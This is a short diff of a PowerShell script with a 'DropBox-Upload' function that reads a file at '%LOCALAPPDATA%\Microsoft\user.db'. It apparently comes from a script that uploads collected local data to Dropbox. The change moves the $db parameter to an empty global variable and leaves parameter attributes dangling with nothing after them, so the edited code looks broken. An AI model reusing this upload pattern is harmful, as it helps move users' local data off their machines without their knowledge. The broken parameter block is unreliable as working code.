@@ -1,3 +1,4 @@
+$db = ""
 function DropBox-Upload {
 
 [CmdletBinding()]
@@ -5,7 +6,6 @@ param (
 	
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
 [Alias("f")]
-[string]$db
 ) 
 
 $SourceFilePath = "%LOCALAPPDATA%\Microsoft\user.db"
